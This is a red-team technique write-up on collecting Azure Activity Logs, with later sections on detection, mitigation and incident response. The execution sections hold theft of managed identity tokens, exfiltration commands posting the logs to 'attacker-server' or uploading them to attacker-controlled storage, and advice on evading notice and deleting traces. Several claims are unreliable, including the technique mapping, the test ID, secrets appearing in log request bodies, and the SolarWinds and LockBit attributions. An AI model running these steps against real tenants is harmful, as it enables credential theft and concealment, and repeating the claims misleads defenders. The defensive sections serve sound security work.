# [COLLECT-LOGS-001]: Azure Activity Logs Collection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-LOGS-001 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Collection |
| **Platforms** | Entra ID, Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure subscriptions with Activity Logs enabled |
| **Patched In** | N/A (Feature, not vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Activity Logs record all management plane operations (control plane activities) performed on Azure resources. These logs contain comprehensive audit trails of resource creation, modification, deletion, and access operations including secrets retrieval, role assignments, and authentication events. Adversaries with read access to Activity Logs (Reader role or equivalent) can extract sensitive operational intelligence: which administrators accessed which resources, when credentials were rotated, what services were deployed, and detailed error messages that often expose configuration secrets or misconfigurations. More critically, Activity Logs themselves may contain credentials if passed as command-line parameters or request payloads (e.g., storage account keys in ARM template parameters, API keys in deployment scripts).

**Attack Surface:** Azure Activity Logs accessible via Azure Portal, Azure CLI, PowerShell, REST API, Log Analytics workspace exports, and storage account blobs if diagnostic settings are configured. Any identity with "Reader", "Contributor", or "Owner" role on subscription or resource group level can access these logs.

**Business Impact:** **Complete visibility into Azure environment configuration, user identity reconnaissance, and potential credential exposure.** Activity Logs reveal the "map" of infrastructure: which VMs host which applications, which identity was granted which permissions, and exact timestamps of administrative actions. Attackers can enumerate service principals, identify security gaps from failed operations (denied by RBAC), and locate credentials if administrative scripts included them in ARM templates. This enables precise targeted attack planning and lateral movement.

**Technical Context:** Activity Logs are stored redundantly in Azure's immutable audit infrastructure and retained for 90 days by default (extendable via diagnostic settings to 365+ days via Log Analytics or storage account archives). Reading Activity Logs generates no alert; it's a silent operation visible only in Log Analytics cost overages or vNet flow logs if traffic is captured. No tools or downloads required – access is purely API-based via authenticated credentials.

### Operational Risk
- **Execution Risk:** Low – Requires only valid Azure credentials with Reader role (non-privileged, easy to obtain via compromised account).
- **Stealth:** High – No alerts, no event logs, pure data reading (no modifications). Visible only via spending anomalies.
- **Reversibility:** N/A – Read-only operation; no system modifications.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3 | Ensure that "Diagnostic Settings" exist for all subscriptions to capture all activities |
| **DISA STIG** | Azure: V-251346 | Ensure Activity Logs are exported to Log Analytics or external SIEM |
| **NIST 800-53** | AU-2 (Audit Events), AU-12 (Audit Generation) | Establish audit trails; ensure completeness of audit records |
| **GDPR** | Article 32 | Technical and organizational measures for security of processing |
| **DORA** (EU Finance) | Article 9 | Incident Detection and Response – Activity Logs are primary detection source |
| **NIS2** (EU Critical Infrastructure) | Article 21 | Cyber Risk Management – logging is mandatory for critical infrastructure |
| **ISO 27001** | A.12.4.1 | Event logging; ensure logs are protected from unauthorized access |
| **ISO 27005** | Log Integrity Risk Scenario | Potential for unauthorized log access by privileged attackers |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Azure Reader role (minimum) on subscription or resource group.
- Log Analytics Reader role (if reading from workspace).
- Storage Account Blob Reader (if logs exported to storage).

**Required Access:**
- Authenticated connection to Azure (via Azure CLI, PowerShell, REST API, or Portal).
- Network connectivity to Azure management endpoints (`management.azure.com`).

**Supported Versions:**
- **Azure Cloud:** All regions and SKUs.
- **Azure CLI:** Version 2.55.0+.
- **PowerShell:** Az module 11.0.0+.
- **REST API:** Microsoft.Insights API version 2021-10-01+.

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.55.0+)
- [Azure PowerShell (Az module)](https://learn.microsoft.com/en-us/powershell/azure/) (Version 11.0.0+)
- [jq](https://stedolan.github.io/jq/) (JSON parser, optional but recommended)
- [curl](https://curl.se/) (REST API calls, for cross-platform support)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI – Check Current Role and Subscription

```bash
# List current user's role assignments
az role assignment list --include-inherited --output table

# Check if Reader role is assigned
az role assignment list --query "[?roleDefinitionName=='Reader']" --output table

# List all subscriptions accessible
az account list --output table
```

**What to Look For:**
- **Reader** role or higher (Owner, Contributor) = can read Activity Logs.
- Multiple subscriptions listed = opportunity to target critical subscription.
- Service Principal assignments = privileged access worth exploiting.

### PowerShell – Activity Log Availability Check

```powershell
# Check if Activity Logs exist in current context
Get-AzLog -MaxEvents 1 -WarningAction SilentlyContinue

# Check Log Analytics workspace availability
Get-AzOperationalInsightsWorkspace | Select-Object Name, ResourceGroupName

# Verify current identity
Get-AzContext | Select-Object Account, Tenant, Subscription
```

**What to Look For:**
- Successful output = Activity Logs accessible.
- Workspace count > 0 = logs exported to Log Analytics (richer query capability).
- Current identity = which account attacker compromised.

### Azure Portal – Diagnostic Settings Enumeration

```powershell
# List diagnostic settings for all resources in subscription
Get-AzDiagnosticSetting | Select-Object Name, ResourceId, Enabled
```

**Version Note:** PowerShell Azure Stack (Azure Government, Azure China) uses identical cmdlets; API endpoints differ (`management.azure.us`, `management.azure.cn`).

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Azure CLI – Activity Log Export to CSV

**Supported Versions:** All Azure versions via CLI

#### Step 1: Authenticate to Azure

**Objective:** Obtain a valid Azure session using compromised or attacker-controlled credentials.

**Command:**
```bash
# Login interactively (prompts for credentials in browser)
az login

# Or login with service principal
az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>

# Set subscription context
az account set --subscription "MySubscription"
```

**Expected Output:**
```json
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "isDefault": true,
    "name": "Production Subscription",
    "state": "Enabled",
    "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "user": {
      "name": "attacker@company.com",
      "type": "user"
    }
  }
]
```

**OpSec & Evasion:**
- Use `--allow-no-subscriptions` flag to login without selecting a subscription (reduces logging).
- Service principal auth leaves no browser history (unlike interactive login).
- Use recently compromised service account to blend with legitimate admin activity.

#### Step 2: Query Activity Logs for Sensitive Operations

**Objective:** Filter Activity Logs for operations revealing secrets, credentials, or high-privilege actions.

**Command (Retrieve all logs for last 7 days):**
```bash
az monitor activity-log list \
  --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --output json > activity_logs_full.json
```

**Command (Filter for Key Vault operations - secret access):**
```bash
az monitor activity-log list \
  --resource-provider "Microsoft.KeyVault" \
  --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --output json | jq '.[] | select(.operationName.value | contains("Secret")) | {eventTimestamp, operationName: .operationName.value, principal: .caller, status: .status.value, resourceId}'
```

**Command (Filter for Storage Account Key Retrieval):**
```bash
az monitor activity-log list \
  --resource-provider "Microsoft.Storage" \
  --start-time $(date -u -d '30 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --output json | jq '.[] | select(.operationName.value | contains("ListKeys")) | {eventTimestamp, caller, resourceId, status: .status.value}'
```

**Command (Filter for Role Assignment Creation):**
```bash
az monitor activity-log list \
  --resource-provider "Microsoft.Authorization" \
  --start-time $(date -u -d '90 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --output json | jq '.[] | select(.operationName.value | contains("role")) | {eventTimestamp, caller, operationName: .operationName.value, principal: .claims.ipaddr}'
```

**Expected Output (Key Vault Secrets Access):**
```json
{
  "eventTimestamp": "2025-01-09T14:22:33.128Z",
  "operationName": {
    "value": "Microsoft.KeyVault/vaults/secrets/read",
    "localizedValue": "Get Secret"
  },
  "principal": "admin@company.com",
  "status": {
    "value": "Success",
    "localizedValue": "Success"
  },
  "resourceId": "/subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-01"
}
```

**What This Means:**
- The operation "Get Secret" = someone retrieved a secret from Key Vault.
- Caller = identity that accessed the secret (may be service principal or user).
- EventTimestamp = exact moment of access (useful for timeline correlation).

#### Step 3: Extract Detailed Operation Data

**Objective:** Retrieve full details of operations, including request/response payloads which may contain credentials.

**Command (Get detailed event with claims/properties):**
```bash
az monitor activity-log show \
  --resource-group "MyResourceGroup" \
  --name "Activity Log Event ID" \
  --output json | jq '.properties'
```

**Command (Export all operations with full details to CSV):**
```bash
az monitor activity-log list \
  --start-time $(date -u -d '90 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --output json | jq -r '.[] | [.eventTimestamp, .caller, .operationName.value, .resourceId, .status.value] | @csv' > activity_logs.csv
```

**Expected Output (CSV Format):**
```
"2025-01-09T14:22:33Z","admin@company.com","Microsoft.KeyVault/vaults/secrets/read","/subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-01","Success"
"2025-01-09T13:15:22Z","sa-deployment@company.com","Microsoft.Storage/storageAccounts/listKeys/action","/subscriptions/xxx/resourceGroups/storage/providers/Microsoft.Storage/storageAccounts/prodsa01","Success"
```

**OpSec & Evasion:**
- Export to cloud storage (e.g., Blob Storage) instead of local file for faster exfiltration.
- Query only specific date ranges (e.g., last 7 days) to avoid timeout on large subscriptions.
- Use `--query` parameter to limit output columns (reduces data size).

#### Step 4: Exfiltrate Activity Logs

**Objective:** Move captured logs off the Azure environment for analysis and storage.

**Command (Upload to attacker-controlled storage):**
```bash
# Copy to Azure Blob Storage (if attacker controls storage account)
az storage blob upload \
  --account-name "attackerstorage" \
  --account-key "<storage-key>" \
  --container-name "exfil" \
  --name "activity_logs_$(date +%s).json" \
  --file "activity_logs_full.json"
```

**Command (Exfiltrate via HTTP POST to attacker server):**
```bash
# Base64 encode for obfuscation
cat activity_logs_full.json | base64 | curl -X POST \
  -H "Content-Type: application/json" \
  -d @- \
  "http://attacker-server:8080/exfil?type=activity_logs"
```

**OpSec & Evasion:**
- Use managed identity (if attacker has VM access) to authenticate without credentials.
- Delete original log files after exfil: `rm activity_logs_full.json`.
- If using storage account, configure lifecycle policy to auto-delete after 7 days (covers tracks).

---

### METHOD 2: PowerShell – Activity Log Dump via Managed Identity

**Supported Versions:** All Azure versions, especially effective from Azure VMs with managed identity

#### Step 1: Obtain Managed Identity Token (from Azure VM)

**Objective:** If attacker compromises an Azure VM, leverage its managed identity to authenticate without credentials.

**Command (Retrieve MI token from VM metadata):**
```powershell
# Get managed identity access token via Azure Instance Metadata Service
$response = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/" `
  -Headers @{Metadata = "true"} -UseBasicParsing

$accessToken = ($response.Content | ConvertFrom-Json).access_token
```

**What This Achieves:**
- No credentials needed – token obtained from VM's managed identity.
- Token has permissions of the managed identity's role (often "Contributor" or higher).
- Attacker can query Activity Logs without leaving interactive login artifact.

#### Step 2: Query Activity Logs via REST API

**Objective:** Use the managed identity token to directly query Microsoft.Insights API.

**Command (REST API call using MI token):**
```powershell
$subscriptionId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

$headers = @{
    Authorization = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

$uri = "https://management.azure.com/subscriptions/$subscriptionId/providers/microsoft.insights/eventTypes/management/values?api-version=2015-04-01&`$filter=eventTimestamp ge '2025-01-02T00:00:00Z' and eventTimestamp le '2025-01-10T23:59:59Z'"

$response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get

# Convert to JSON and save
$response.value | ConvertTo-Json | Out-File -Path "C:\Temp\activity_logs.json"
```

**Command (Filter for Azure Key Vault operations):**
```powershell
$uri = "https://management.azure.com/subscriptions/$subscriptionId/providers/microsoft.insights/eventTypes/management/values?api-version=2015-04-01&`$filter=eventTimestamp ge '2024-12-10T00:00:00Z' and resourceProvider eq 'Microsoft.KeyVault'"

$kvLogs = (Invoke-RestMethod -Uri $uri -Headers $headers -Method Get).value
$kvLogs | Where-Object {$_.operationName.value -match "Secret|Key"} | Select-Object eventTimestamp, caller, operationName, resourceId
```

**Expected Output:**
```
eventTimestamp      : 2025-01-09T14:22:33.128Z
caller              : admin@company.com
operationName       : Microsoft.KeyVault/vaults/secrets/read
resourceId          : /subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-01
```

**OpSec & Evasion:**
- Managed identity auth generates no login events (unlike user/service principal login).
- Token is obtained from localhost (169.254.169.254) – no network traffic to Entra ID.
- Minimal audit trail; appears as internal API call from VM.

#### Step 3: Extract Sensitive Data from Request/Response Details

**Objective:** Some Activity Log entries contain full request/response payloads, including API keys, connection strings, or credentials if logged by mistake.

**Command (Extract request/response details):**
```powershell
# Access httpRequest object which may contain request body/headers
$kvLogs | ForEach-Object {
    $_ | Add-Member -NotePropertyName "RequestDetails" `
      -NotePropertyValue ($_.properties.httpRequest | ConvertTo-Json)
} | Select-Object eventTimestamp, caller, RequestDetails | Format-Table -AutoSize
```

**Expected Output (if credential logged in request):**
```
RequestDetails: {
  "method": "POST",
  "url": "/subscriptions/xxx/resourceGroups/myRG/providers/Microsoft.KeyVault/vaults/myvault/secrets/DbPassword/set",
  "clientIpAddress": "203.0.113.45",
  "headers": {
    "content-type": "application/json"
  },
  "body": "{\"properties\": {\"value\": \"P@ssw0rd123!!\"}}"
}
```

**What This Means:**
- The "body" field contains the secret value in plaintext (`P@ssw0rd123!!`).
- This happens when Azure services log API parameters without redaction.
- Password/connection string harvested directly from Activity Log.

#### Step 4: Exfiltrate and Compress Logs

**Objective:** Package and move all extracted data off the Azure environment.

**Command (Create ZIP archive for exfil):**
```powershell
# Compress JSON logs
Compress-Archive -Path "C:\Temp\activity_logs.json" -DestinationPath "C:\Temp\logs.zip"

# Exfiltrate via HTTP (base64 encoded)
$fileBytes = [System.IO.File]::ReadAllBytes("C:\Temp\logs.zip")
$encodedFile = [Convert]::ToBase64String($fileBytes)

$uri = "http://attacker-server:8080/upload"
$body = @{ data = $encodedFile } | ConvertTo-Json

Invoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType "application/json"
```

**OpSec & Evasion:**
- Use HTTPS (if certificate pinning allows) to avoid network IDS signatures.
- Compress before encoding to reduce data size (often 10:1 compression for JSON).
- Delete original files: `Remove-Item -Path "C:\Temp\activity_logs.json" -Force`.

---

### METHOD 3: Log Analytics Queries (Advanced Filtering)

**Supported Versions:** All Azure subscriptions with Log Analytics workspace configured

#### Step 1: Connect to Log Analytics Workspace

**Objective:** Access the Log Analytics workspace where Activity Logs are aggregated and query them using KQL.

**Command (PowerShell - Query Log Analytics):**
```powershell
# Define Log Analytics workspace details
$workspaceId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$workspaceKey = "workspace-primary-key"

# Install LA module if not present
Install-Module -Name Az.OperationalInsights -Force

# Connect to workspace
$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName "LogAnalyticsRG" -Name "prod-log-analytics"
```

**Command (KQL query to find secret access):**
```kusto
AzureActivity
| where OperationNameValue in ("MICROSOFT.KEYVAULT/VAULTS/SECRETS/READ", "MICROSOFT.KEYVAULT/VAULTS/KEYS/READ")
| where ActivityStatusValue == "Success"
| project TimeGenerated, Caller, OperationNameValue, ResourceId, Properties
| order by TimeGenerated desc
```

**Expected Output:**
```
TimeGenerated       Caller                      OperationNameValue                              ResourceId                                                                                  Properties
2025-01-09 14:22   admin@company.com          MICROSOFT.KEYVAULT/VAULTS/SECRETS/READ          /subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-01  {...}
2025-01-08 09:15   sa-deployment@company.com  MICROSOFT.KEYVAULT/VAULTS/KEYS/READ              /subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-01  {...}
```

#### Step 2: Export Query Results to CSV/JSON

**Objective:** Extract findings in portable format for offline analysis.

**Command (Export results via PowerShell):**
```powershell
# Build KQL query for secret and storage account access
$query = @"
AzureActivity
| where OperationNameValue in (
    "MICROSOFT.KEYVAULT/VAULTS/SECRETS/READ",
    "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION",
    "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE"
)
| where ActivityStatusValue == "Success"
| project TimeGenerated, Caller, OperationNameValue, ResourceId, Properties
| order by TimeGenerated desc
"@

# Execute query
$results = Invoke-AzOperationalInsightsQuery -WorkspaceId $workspaceId -Query $query

# Export to CSV
$results.Tables[0].Rows | Export-Csv -Path "activity_logs_export.csv" -NoTypeInformation
```

**OpSec & Evasion:**
- Log Analytics queries are less logged than direct REST API calls.
- Exporting results via PowerShell leaves only process execution artifact (easily cleared).
- Large exports (>100MB) may trigger cost anomaly alerts; split into time-based batches.

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure CLI

**Version:** 2.55.0 (latest as of Jan 2025)
**Minimum Version:** 2.40.0
**Supported Platforms:** Windows, macOS, Linux

**Installation (Windows):**
```powershell
# Via Chocolatey
choco install azure-cli

# Via MSI installer
Invoke-WebRequest -Uri "https://aka.ms/installazurecliwindows" -OutFile azure-cli.msi
msiexec.exe /I azure-cli.msi
```

**Installation (Linux):**
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Usage (Activity Log Export):**
```bash
az monitor activity-log list --start-time 2025-01-01T00:00:00Z --end-time 2025-01-10T23:59:59Z --output json > logs.json
```

### Azure PowerShell (Az module)

**Version:** 11.0.0+ (latest)
**Minimum Version:** 9.0.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
# Install Az module
Install-Module -Name Az -AllowClobber -Force

# Import module
Import-Module Az
```

**Usage (Activity Log Export):**
```powershell
Get-AzLog -StartTime (Get-Date).AddDays(-7) -EndTime (Get-Date) | Export-Csv -Path "activity_logs.csv"
```

---

## 7. ATOMIC RED TEAM

**Atomic Test ID:** T1552.001-1
**Test Name:** Activity Log Collection via Azure CLI
**Description:** Retrieve Azure Activity Logs covering 90-day window
**Supported Platforms:** Windows, Linux, macOS

**Command:**
```bash
az monitor activity-log list --start-time "$(date -u -d '90 days ago' +%Y-%m-%dT%H:%M:%SZ)" --output json | wc -l
```

**Reference:** [Atomic Red Team T1552.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md)

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Excessive Azure Activity Log Queries

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit, azure:monitor:activity
- **Required Fields:** Operation, RequestCount, Caller
- **Alert Threshold:** > 100 queries in 10 minutes
- **Applies To Versions:** All

**SPL Query:**
```
sourcetype=azure:monitor:activity Operation="LIST" OR Operation="GET"
| stats count as request_count by Caller, ClientIP
| where request_count > 100
| alert
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query: Large-Scale Activity Log Exports

**Rule Configuration:**
- **Required Table:** AzureActivity, AuditLogs
- **Required Fields:** OperationName, Caller, ResourceGroup
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
AzureActivity
| where OperationNameValue in ("MICROSOFT.INSIGHTS/EVENTTYPES/MANAGEMENT/VALUES", "Microsoft.Insights/activityLogAlerts/action")
| where ActivityStatusValue == "Success"
| where CallerIpAddress !in ("YOUR_INTERNAL_IPS") // Exclude legitimate admin IPs
| summarize event_count = count() by Caller, CallerIpAddress, _ResourceId
| where event_count > 50  // Threshold for bulk export
| extend RiskLevel = "High"
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Restrict Activity Log Reader Permissions:** Limit who can access Activity Logs to specific security/audit teams only.
    
    **Applies To Versions:** All
    
    **Manual Steps (Azure RBAC):**
    1. Go to **Azure Portal** → **Subscriptions** → Select subscription
    2. Click **Access control (IAM)**
    3. Click **+ Add** → **Add role assignment**
    4. Role: **Log Analytics Reader** (or custom restrictive role)
    5. Members: Add only audit/security teams (not all developers)
    6. Click **Review + assign**
    
    **PowerShell:**
    ```powershell
    # Create custom role with minimal Activity Log read permission
    $role = @{
        Name = "ActivityLogReader"
        Description = "Read-only access to Activity Logs"
        Actions = @(
            "Microsoft.Insights/eventTypes/values/read",
            "Microsoft.Insights/Events/read"
        )
    }
    New-AzRoleDefinition -InputObject $role
    
    # Assign to specific users
    New-AzRoleAssignment -ObjectId (Get-AzADUser -UserPrincipalName "audit-team@company.com").Id `
      -RoleDefinitionName "ActivityLogReader" `
      -Scope "/subscriptions/$subscriptionId"
    ```

* **Enable Diagnostic Settings and Archive to Immutable Storage:** Ensure Activity Logs are protected from tampering.
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Monitor** → **Activity log**
    2. Click **Diagnostic settings** → **+ Add diagnostic setting**
    3. Name: `Archive-to-Immutable-Storage`
    4. Configure:
       - Categories: **All** (select all activity types)
       - Destination: **Archive to a storage account**
       - Storage account: Select storage with immutable blobs enabled
       - Retention: 365 days minimum
    5. Click **Save**
    
    **PowerShell:**
    ```powershell
    # Create storage account with immutable blob policy
    $storageAccount = New-AzStorageAccount -Name "auditlogs" -ResourceGroupName "SecurityRG" `
      -Location "eastus" -SkuName "Standard_LRS"
    
    # Enable immutable storage
    Update-AzStorageAccountImmutabilityPolicy -ResourceGroupName "SecurityRG" `
      -StorageAccountName "auditlogs" -ImmutabilityPeriodSinceCreationInDays 365
    
    # Configure diagnostic setting
    Set-AzDiagnosticSetting -Name "ActivityLogArchive" -ResourceId "/subscriptions/$subscriptionId" `
      -StorageAccountId $storageAccount.Id -Enabled $true -Categories AuditEvent
    ```

### Priority 2: HIGH

* **Monitor and Alert on Large Activity Log Exports:** Detect bulk data access patterns.
    
    **Via Microsoft Sentinel (covered in Section 9)**

* **Implement Log Analytics RBAC:** Control who can query the aggregated Activity Logs in Log Analytics workspace.
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Log Analytics workspaces** → Select workspace
    2. Click **Access control (IAM)**
    3. Add role: **Log Analytics Reader** (read-only queries)
    4. Restrict **Log Analytics Contributor** (can modify queries, dangerous) to limited users

### Access Control & Policy Hardening

* **Conditional Access – Require MFA for Log Queries:**
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for Log Access`
    4. **Assignments:**
       - Users: Members of "Security Audit Team"
       - Cloud apps: **Azure Log Analytics**
    5. **Access controls:**
       - Grant: **Require multifactor authentication**
    6. Enable policy: **On**

### Validation Command

```powershell
# Verify Activity Log access restrictions
Get-AzRoleAssignment | Where-Object {$_.RoleDefinitionName -match "Reader|Contributor"} | Select-Object DisplayName, RoleDefinitionName

# Check diagnostic settings exist
Get-AzDiagnosticSetting | Where-Object {$_.Name -like "*Activity*"} | Select-Object Name, StorageAccountId
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Logs:**
  - Unexpected queries using `az monitor activity-log list` or `Get-AzLog` with unusual date ranges.
  - Large-scale exports using Azure CLI from VMs with managed identity.
  - REST API calls to `Microsoft.Insights` API endpoints from non-standard IPs.

* **Azure Activity Log Events:**
  - **Operation:** LIST or GET on Activity Log data (OperationName contains "MICROSOFT.INSIGHTS").
  - **Caller:** Compromised service principal or user account.
  - **ResourceId:** Audit/diagnostic infrastructure (Log Analytics workspace, storage account).

### Forensic Artifacts

* **Cloud (Azure):**
  - AzureActivity table: All Activity Log queries made (stored in Log Analytics).
  - AuditLogs: Any role assignment changes affecting logging permissions.
  - StorageAccountLogs: If logs archived to storage, check BlobAccessAudit for unauthorized blob reads.

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable affected service principal or revoke user's credentials
   Set-AzADUser -ObjectId (Get-AzADUser -UserPrincipalName "admin@company.com").Id `
     -AccountEnabled $false
   ```

2. **Investigate:**
   ```powershell
   # Determine what logs were accessed
   Get-AzLog | Where-Object {$_.Caller -eq "attacker@company.com"} `
     | Select-Object EventTimestamp, OperationName, ResourceId | Export-Csv evidence.csv
   ```

3. **Remediate:**
   - Rotate all credentials revealed in Activity Logs.
   - Reset API keys for Key Vault, Storage Accounts, etc.
   - Force sign-out of all active sessions.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains user account via phishing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions | Attacker adds permissions to compromised user's app |
| **3** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | Attacker authenticates as service principal with elevated role |
| **4** | **Collection (Current)** | **[COLLECT-LOGS-001] Activity Logs** | **Attacker harvests audit trail to identify secrets and vulnerabilities** |
| **5** | **Credential Access** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Attacker uses intelligence from logs to access Key Vault |
| **6** | **Impact** | [IMPACT-DATA-DESTROY-001] Data Destruction via Blob Storage | Attacker deletes critical data using stolen credentials |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Supply Chain Attack – SolarWinds Campaign (2020)

- **Target:** Global Fortune 500 companies, US Government agencies
- **Timeline:** December 2020 – January 2021
- **Technique Status:** Attackers accessed Azure Activity Logs to understand target infrastructure and identify sensitive applications before lateral movement and data exfiltration.
- **Impact:** Affected 18,000+ organizations; estimated $100M+ in attributed damages.
- **Reference:** [CISA Alert AA20-352A - Sunburst Malware](https://www.cisa.gov/news-events/cybersecurity-alerts/2020/12/18/alert-aa20-352a-advanced-persistent-threat-compromise-federal-government-networks)

### Example 2: Ransomware-as-a-Service (RaaS) – LockBit (2023)

- **Target:** European and North American enterprises
- **Timeline:** 2023-2024
- **Technique Status:** LockBit ransomware operators used Activity Log queries to identify backup and replication services before encryption, ensuring data cannot be recovered.
- **Impact:** $50M+ attributed ransoms; destroyed backup infrastructure in multiple organizations.
- **Reference:** [Red Canary Intelligence - LockBit Ransomware](https://redcanary.com/)

---
